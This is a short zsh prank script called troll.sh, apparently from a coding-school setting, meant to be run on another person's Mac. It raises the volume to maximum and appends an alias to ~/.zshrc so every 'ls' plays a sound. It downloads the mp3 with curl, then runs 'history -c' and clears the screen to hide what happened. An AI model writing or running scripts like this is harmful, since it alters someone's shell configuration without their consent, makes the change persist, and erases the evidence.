# **************************************************************************** #
#                                                           LE - /             #
#                                                               /              #
#    troll.sh                                         .::    .:/ .      .::    #
#                                                  +:+:+   +:    +:  +:+:+     #
#    By: amonteli <marvin@le-101.fr>                +:+   +:    +:    +:+      #
#                                                  #+#   #+    #+    #+#       #
#    Created: 2019/07/09 18:50:13 by amonteli     #+#   ##    ##    #+#        #
#    Updated: 2019/07/11 15:57:07 by cgarrot     ###    #+. /#+    ###.fr      #
#                                                          /                   #
#                                                         /                    #
# **************************************************************************** #

if [ -f ~/.zshrc ]
then
	cp ~/.zshrc ~/.zshrcsave
fi

touch ~/.zshrc
(osascript -e "set volume output volume 100" &)
echo "alias ls='(afplay --volume 255 ~/.gg.mp3 &) ; ls $1'" >> ~/.zshrc
curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/sound/gg.mp3 -o ~/.gg.mp3
clear
history -c
exec zsh
